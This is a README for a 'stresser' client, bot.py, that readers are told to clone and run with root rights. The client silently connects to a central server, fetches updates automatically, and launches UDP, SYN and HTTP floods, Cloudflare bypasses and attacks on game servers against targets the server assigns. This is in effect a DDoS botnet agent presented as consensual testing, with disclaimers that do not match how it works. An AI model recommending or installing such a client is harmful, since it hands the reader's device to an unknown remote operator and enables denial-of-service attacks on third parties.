FSOCIETY Stresser Client

FSOCIETY Stresser Client is a lightweight Python-based client for stress testing websites and network infrastructure. By running this client, you can participate in a distributed stress testing network, contributing to server resilience testing for Layer 4 (L4) and Layer 7 (L7) protocols. This tool is designed for educational and authorized testing purposes only. Please ensure you have permission from server owners before participating in any tests.

Note: By running this client, you agree to contribute your device's resources to a distributed testing network. Only use this tool if you understand and consent to its operation.

Features





Distributed Testing: Connects to a central server to perform coordinated stress tests.



Layer 4 Methods: Supports UDP, TCP, SYN, ICMP, and more for network-layer testing.



Layer 7 Methods: Includes HTTP-based tests like HTTPGET, HTTPIO, and Cloudflare bypass.



Game Server Testing: Specialized methods for Minecraft, FiveM, Roblox, and Among Us servers.



Stealth Operation: Minimizes system impact and runs silently in the background.



Auto-Updates: Automatically fetches the latest testing features from the server.

Prerequisites

To run the FSOCIETY Stresser, you need:





Python 3.8 or higher



Windows or Linux operating system



Internet connection for connecting to the testing network



Administrative/root privileges for some network operations

Installation

Follow these steps to set up the client:





Clone the Repository:

git clone https://github.com/<perusiagafasfa>/FREE-STRESSER
cd fsociety-stresser-client



Install Dependencies: Install the required Python packages:

pip install -r requirements.txt

If requirements.txt is not included, install the following packages manually:

pip install colorama requests cloudscraper scapy icmplib pycryptodome psutil



Run the Client: Start the client by running:

python3 bot.py

On Linux, you may need sudo for certain network operations:

sudo python3 bot.py

How It Works





The client connects to a central testing server and waits for instructions.



When a test is initiated, your device contributes resources to perform stress tests on specified targets (e.g., HTTP floods, UDP floods).



The client runs silently and ensures minimal system impact with built-in resource monitoring.



Updates are automatically fetched to keep the client up-to-date with the latest testing methods.

Important Notes





Consent: By running this client, you agree to let your device participate in a distributed testing network. Your device may send network requests as part of coordinated tests.



Legal Use: Only use this tool for authorized testing with explicit permission from server owners. Unauthorized use is illegal and against the terms of service.



System Resources: The client is designed to use minimal CPU and memory, but performance may vary based on test intensity.

Troubleshooting





Client doesn't start:





Ensure all dependencies are installed (pip install -r requirements.txt).



Run from a terminal to see error messages: python3 bot.py.



Check your internet connection, as the client needs to connect to the testing server.



Permission errors:





Run as administrator/root: sudo python3 bot.py.



High resource usage:





The client automatically limits CPU and memory usage, but you can stop it by closing the terminal or killing the process.
